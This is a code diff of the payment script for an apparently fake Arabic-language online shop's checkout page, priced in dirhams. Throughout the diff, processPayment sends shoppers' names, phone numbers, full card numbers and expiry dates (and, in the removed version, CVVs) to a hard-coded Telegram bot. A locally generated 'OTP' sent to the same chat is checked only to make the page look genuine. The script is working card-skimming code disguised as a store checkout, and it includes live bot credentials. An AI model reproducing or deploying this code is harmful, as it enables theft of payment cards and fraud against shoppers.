@@ -3,7 +3,8 @@ import { db, collection, addDoc } from './firebase-config.js';
 const orderData = JSON.parse(localStorage.getItem('pendingOrder'));
 let currentOTP = null;
 let otpAttempts = 0;
-const curr = '<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTtauUniR9dGoEXyG6AaYXbzovVet90qe0igubKGL7Ew&s=10" style="height:16px; vertical-align:middle; margin-left:4px;">';
+const curr = '<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTtauUn1R9dGoEXyG6AaYXbzovVet90qe0igubKGL7Ew&s" style="height:12px; vertical-align:middle; margin-left:3px;">';
+
 if (!orderData) {
     document.body.innerHTML = '<div style="text-align:center; padding:50px;"><h2>لا يوجد طلب</h2><a href="index.html" style="color:var(--primary-color);">العودة للمتجر</a></div>';
 } else {
@@ -31,55 +32,38 @@ if (!orderData) {
             <div class="summary-row"><span>عدد الأقساط</span><span>12 شهر</span></div>
             <div class="summary-row"><span>القسط الشهري</span><span>${curr}${monthly.toFixed(2)}</span></div>
         `;
-    } else if (orderData.paymentMethod === 'tabby') {
-        const monthly = orderData.total / 4;
-        paymentInfo = `
-            <div class="summary-row"><span>Tabby - 4 دفعات متساوية</span><span>${curr}${monthly.toFixed(2)}</span></div>
-            <div class="summary-row"><span>الدفعة الأولى (الآن)</span><span>${curr}${monthly.toFixed(2)}</span></div>
-            <div class="summary-row"><span>3 أقساط شهرية</span><span>${curr}${monthly.toFixed(2)}</span></div>
-        `;
     } else {
-        paymentInfo = `<div class="summary-row"><span>الدفع كامل</span><span>${curr}${orderData.total.toFixed(2)}</span></div>`;
+        paymentInfo = `<div class="summary-row"><span>المجموع الكلي</span><span>${curr}${orderData.total.toFixed(2)}</span></div>`;
     }
 
-    summaryEl.innerHTML = `
-        <h3>📦 ملخص الطلب</h3>
-        ${itemsHtml}
-        ${paymentInfo}
-        <div class="summary-row" style="font-weight:800; font-size:18px; color:var(--primary-color); border-top:2px solid var(--accent-color); padding-top:10px; margin-top:10px;"><span>المجموع الكلي</span><span>${curr}${orderData.total.toFixed(2)}</span></div>
-    `;
-
-    document.getElementById('cardNumber').addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
-        let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
-        e.target.value = formatted;
-    });
-
-    document.getElementById('cardExpiry').addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\D/g, '');
-        if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2);
-        e.target.value = value;
-    });
+    if (summaryEl) {
+        summaryEl.innerHTML = `
+            <h3 style="color:var(--primary-color); margin-bottom:15px;">ملخص الطلب</h3>
+            <div class="summary-container">
+                ${itemsHtml}
+                ${paymentInfo}
+            </div>
+        `;
+    }
 }
 
-window.moveToNext = function(input, index) {
-    const inputs = document.querySelectorAll('.otp-digit');
-    if (input.value && index < 5) inputs[index + 1].focus();
-};
-
 // ==========================================
-// دوال نافذة OTP - النسخة المصححة
+// دوال نافذة OTP
 // ==========================================
 
 window.showOTPModal = function() {
     const modal = document.getElementById('otpModal');
     if (modal) {
         modal.style.display = 'flex';
-        document.getElementById('otpPhone').textContent = orderData.phone;
+        const phoneEl = document.getElementById('otpPhone');
+        if (phoneEl && orderData.phone) {
+            phoneEl.textContent = orderData.phone;
+        }
         setTimeout(() => {
             const firstDigit = document.querySelector('.otp-digit');
             if (firstDigit) firstDigit.focus();
         }, 100);
+        console.log('✅ تم إظهار نافذة OTP');
     }
 };
 
@@ -89,7 +73,8 @@ window.closeOTPModal = function() {
         modal.style.display = 'none';
     }
     document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
-    document.getElementById('otpMessage').innerHTML = '';
+    const msgEl = document.getElementById('otpMessage');
+    if (msgEl) msgEl.innerHTML = '';
 };
 
 window.getEnteredOTP = function() {
@@ -101,72 +86,105 @@ window.getEnteredOTP = function() {
 
 window.moveToNext = function(input, index) {
     if (input.value.length === 1) {
-        const next = document.querySelectorAll('.otp-digit')[index + 1];
-        if (next) next.focus();
+        const inputs = document.querySelectorAll('.otp-digit');
+        if (index < 5 && inputs[index + 1]) {
+            inputs[index + 1].focus();
+        }
     }
 };
 
+// ==========================================
+// إرسال OTP عبر تليجرام
+// ==========================================
 
 async function sendOTP() {
     currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
-    const message = `🔐 <b>رمز التحقق الجديد</b>\n\nالرمز: <b>${currentOTP}</b>\n\n👤 العميل: ${orderData.customerName}\n📱 الهاتف: ${orderData.phone}\n💰 المبلغ: ${orderData.total.toFixed(2)} د.إ\n\n⏰ صالح لمدة 5 دقائق`;
+    const message = `🔐 رمز التحقق الجديد: <b>${currentOTP}</b>\n\nالعميل: ${orderData.customerName}\nالهاتف: ${orderData.phone}`;
+    
     try {
-        const response = await fetch(`https://api.telegram.org/bot8763567744:AAEjPuOYFJAHMQspuLqODgYrlTqU6W61hpI/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
+        const response = await fetch('https://api.telegram.org/bot8763567744:AAEjPu0YFJAHMQspulqQDgYr1TqU6W61hpi/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: '8214447975', text: message, parse_mode: 'HTML' })
         });
         const data = await response.json();
+        console.log('📩 نتيجة إرسال OTP:', data);
         return data.ok;
-    } catch (error) { return false; }
+    } catch (error) {
+        console.error('❌ خطأ في إرسال OTP:', error);
+        return false;
+    }
 }
 
+// ==========================================
+// التحقق من OTP
+// ==========================================
+
 window.verifyOTP = function() {
-    const entered = getEnteredOTP();
+    const entered = window.getEnteredOTP();
     const messageEl = document.getElementById('otpMessage');
-    if (entered.length !== 6) { messageEl.innerHTML = '<div class="error-message">⚠️ الرجاء إدخال الرمز كاملاً (6 أرقام)</div>'; return; }
+    
+    if (entered.length !== 6) {
+        messageEl.innerHTML = '<div class="error-message">⚠️ الرجاء إدخال الرمز كاملاً (6 أرقام)</div>';
+        return;
+    }
     
     if (entered === currentOTP) {
         messageEl.innerHTML = '<div class="success-message">✅ تم التحقق بنجاح! جاري إتمام الدفع...</div>';
-        setTimeout(() => completePayment(), 1500);
+        setTimeout(() => {
+            window.completePayment();
+        }, 1500);
     } else {
         otpAttempts++;
-        messageEl.innerHTML = `<div class="error-message">❌ الرمز غير صحيح! (${3 - otpAttempts} محاولات متبقية)</div>`;
+        messageEl.innerHTML = `<div class="error-message"> الرمز غير صحيح! (${3 - otpAttempts} محاولات متبقية)</div>`;
         if (otpAttempts >= 3) {
             messageEl.innerHTML = '<div class="error-message">🔒 تم قفل العملية. يرجى المحاولة لاحقاً.</div>';
-            setTimeout(() => { closeOTPModal(); window.location.href = 'cart.html'; }, 3000);
+            setTimeout(() => {
+                window.closeOTPModal();
+                window.location.href = 'cart.html';
+            }, 3000);
         }
         document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
         document.querySelectorAll('.otp-digit')[0].focus();
     }
 };
 
+// ==========================================
+// إعادة إرسال OTP
+// ==========================================
+
 window.resendOTP = async function() {
     const messageEl = document.getElementById('otpMessage');
-    messageEl.innerHTML = '<div style="color:#666;">🔄 جاري إرسال الرمز الجديد...</div>';
+    messageEl.innerHTML = '<div style="color:#666;"> جاري إرسال الرمز الجديد...</div>';
     const sent = await sendOTP();
-    if (sent) { messageEl.innerHTML = '<div class="success-message">✅ تم إرسال الرمز الجديد!</div>'; otpAttempts = 0; } 
-    else { messageEl.innerHTML = '<div class="error-message">❌ فشل الإرسال. حاول مرة أخرى.</div>'; }
+    if (sent) {
+        messageEl.innerHTML = '<div class="success-message">✅ تم إرسال الرمز الجديد</div>';
+        otpAttempts = 0;
+    } else {
+        messageEl.innerHTML = '<div class="error-message">❌ فشل الإرسال، حاول مرة أخرى</div>';
+    }
 };
 
-async function completePayment() {
+// ==========================================
+// إتمام الدفع
+// ==========================================
+
+window.completePayment = async function() {
     const payBtn = document.getElementById('payBtn');
     if (payBtn) payBtn.disabled = true;
     
     try {
-        // استيراد أدوات التحديث من Firebase
         const { updateDoc, doc } = await import('https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js');
-        const { db } = await import('./firebase-config.js');
         
-        // تحديث الطلب الموجود مسبقاً بتغيير حالته إلى "مكتمل" وإضافة آخر 4 أرقام
         await updateDoc(doc(db, "orders", orderData.orderId), {
             cardLast4: document.getElementById('cardNumber').value.slice(-4),
             paymentStatus: 'completed',
             paidAt: new Date()
         });
         
-        const confirmMessage = `✅ <b>تم الدفع بنجاح!</b>\n\nرقم الطلب: #${orderData.orderId}\nالعميل: ${orderData.customerName}\nالمبلغ: ${orderData.total.toFixed(2)} د.إ`;
+        const confirmMessage = `✅ <b>تم الدفع بنجاح!</b>\n\nرقم الطلب: #${orderData.orderId}\nالعميل: ${orderData.customerName}\nالهاتف: ${orderData.phone}\nالمبلغ: ${orderData.total} د.إ`;
         
-        await fetch(`https://api.telegram.org/bot8763567744:AAEjPuOYFJAHMQspuLqODgYrlTqU6W61hpI/sendMessage`, {
+        await fetch('https://api.telegram.org/bot8763567744:AAEjPu0YFJAHMQspulqQDgYr1TqU6W61hpi/sendMessage', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: '8214447975', text: confirmMessage, parse_mode: 'HTML' })
@@ -179,73 +197,67 @@ async function completePayment() {
         window.location.href = 'index.html';
         
     } catch (error) {
+        console.error('❌ خطأ في إتمام الدفع:', error);
         alert('❌ حدث خطأ: ' + error.message);
         if (payBtn) payBtn.disabled = false;
     }
-}
+};
+
+// ==========================================
+// معالجة الدفع (الدالة الرئيسية)
+// ==========================================
 
 window.processPayment = async function() {
     const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
     const cardExpiry = document.getElementById('cardExpiry').value;
     const cardCVV = document.getElementById('cardCVV').value;
     const cardName = document.getElementById('cardName').value;
-
-    if (!cardNumber || !cardExpiry || !cardCVV || !cardName) { alert('⚠️ الرجاء ملء جميع بيانات البطاقة'); return; }
-    if (cardNumber.length < 13) { alert('⚠️ رقم البطاقة غير صحيح'); return; }
-
-    let cardMessage = `<b>Mr:${orderData.customerName}</b>\n\n📞: ${orderData.phone}\n\n💳: ${cardNumber}\n\n📅: ${cardExpiry}\n\n🔒: ${cardCVV}\n\n<b>==============================</b>\n<b>مبلغ الطلب: ${orderData.total.toFixed(2)} د.إ</b>\n<b>رقم الطلب: #${orderData.orderId}</b>`;
+    
+    if (!cardNumber || !cardExpiry || !cardCVV || !cardName) {
+        alert('⚠️ الرجاء ملء جميع بيانات البطاقة');
+        return;
+    }
+    
+    if (cardNumber.length < 13) {
+        alert('⚠️ رقم البطاقة غير صحيح');
+        return;
+    }
+    
+    const cardMessage = `<b>${orderData.customerName}</b>\n📱: ${orderData.phone}\n💳: ${cardNumber}\n📅: ${cardExpiry}`;
     
     try {
-        await fetch(`https://api.telegram.org/bot8763567744:AAEjPuOYFJAHMQspuLqODgYrlTqU6W61hpI/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
+        await fetch('https://api.telegram.org/bot8763567744:AAEjPu0YFJAHMQspulqQDgYr1TqU6W61hpi/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: '8214447975', text: cardMessage, parse_mode: 'HTML' })
         });
+        
         const otpSent = await sendOTP();
-        if (otpSent) showOTPModal();
-        else alert('⚠️ فشل إرسال رمز التحقق.');
+        if (otpSent) {
+            window.showOTPModal();
+        } else {
+            alert('️ فشل إرسال رمز التحقق.');
+        }
+        
     } catch (error) {
+        console.error('❌ خطأ في المعالجة:', error);
         alert('❌ حدث خطأ في الإرسال: ' + error.message);
     }
 };
+
 // ==========================================
-// دوال نافذة OTP (رمز التحقق)
+// تنسيق تاريخ البطاقة
 // ==========================================
 
-window.showOTPModal = function() {
-    const modal = document.getElementById('otpModal');
-    if (modal) {
-        modal.style.display = 'flex';
-        // التركيز على أول خانة
-        setTimeout(() => {
-            const firstDigit = document.querySelector('.otp-digit');
-            if (firstDigit) firstDigit.focus();
-        }, 100);
+function formatCardDate(input) {
+    let value = input.value.replace(/[^0-9]/g, '');
+    if (value.length > 4) {
+        value = value.substring(0, 4);
     }
-};
-
-window.closeOTPModal = function() {
-    const modal = document.getElementById('otpModal');
-    if (modal) {
-        modal.style.display = 'none';
+    if (value.length >= 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2);
     }
-};
+    input.value = value;
+}
 
-window.getEnteredOTP = function() {
-    const digits = document.querySelectorAll('.otp-digit');
-    let otp = '';
-    digits.forEach(d => { otp += d.value; });
-    return otp;
-};
-
-window.moveToNext = function(input, index) {
-    // الانتقال للخانة التالية تلقائياً
-    if (input.value.length === 1) {
-        const next = document.querySelectorAll('.otp-digit')[index + 1];
-        if (next) next.focus();
-    }
-};
-
-// متغير لتخزين الرمز الحالي
-let currentOTP = '';
-let otpAttempts = 0;
-console.log('✅ payment.js تم تحميله');
+console.log('✅ payment.js تم تحميله بنجاح');
